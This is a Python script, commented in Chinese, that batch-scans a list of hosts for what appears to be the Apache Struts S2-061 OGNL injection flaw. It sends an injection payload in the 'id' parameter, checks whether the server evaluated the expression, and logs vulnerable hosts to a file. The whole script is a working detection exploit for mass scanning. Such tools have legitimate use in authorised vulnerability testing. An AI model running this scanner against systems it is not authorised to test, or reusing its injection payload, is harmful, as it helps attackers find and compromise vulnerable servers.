#!/usr/bin/python3

import sys
import requests
import platform
from bs4 import BeautifulSoup

#统一URL格式，以“/”结尾
def correct_url(host_file):
    with open(host_file, "r") as f:
        hosts = f.readlines();
        correct_urls = [];
        for host in hosts:
            if platform.system() == "Linux":
                host = host.strip("\n");
            if platform.system() == "Windows":
                host = host.strip("\r\n");
            if host.endswith("/"):
                correct_urls.append(host);
            else:
                correct_urls.append(host + "/");
    return correct_urls;

#使用漏洞复现中的EXP1验证漏洞是否存在
def vuln_detect(url):
    payload = "?id=%25%7b+%27test%27+%2b+(2000+%2b+20).toString()%7d";
    full_url = url + payload;
    try:
        r = requests.get(full_url);
        if "test2020" in r.text:
            return "True";
        else:
            return "False";
    except requests.exceptions.ConnectionError:
        return "connection error";
    except BaseException as e:
        return e;

def main():
    if len(sys.argv) == 2:
        host_file = sys.argv[1];
    else:
        print("Usage: below example is from ubuntu");
        print("Usage: python3 s2-061-batch-detect-exp.py hosts.txt");
        exit();

    #统一URL格式，以“/”结尾
    correct_urls = correct_url(host_file);

    with open("vulnerable.txt", "w") as f0:
        for url in correct_urls:
            result = vuln_detect(url);
            if result == "True":
                print(url + " is vulnerable");
                if platform.system() == "Linux":
                    f0.write(url + "\n");
                if platform.system() == "Windows":
                    f0.write(url + "\r\n");
            elif result == "False":
                print(url + " is not vulnerable");
            else:
                print(url + " " + result);
        print("The result has been output to the vulnerable.txt");

main();
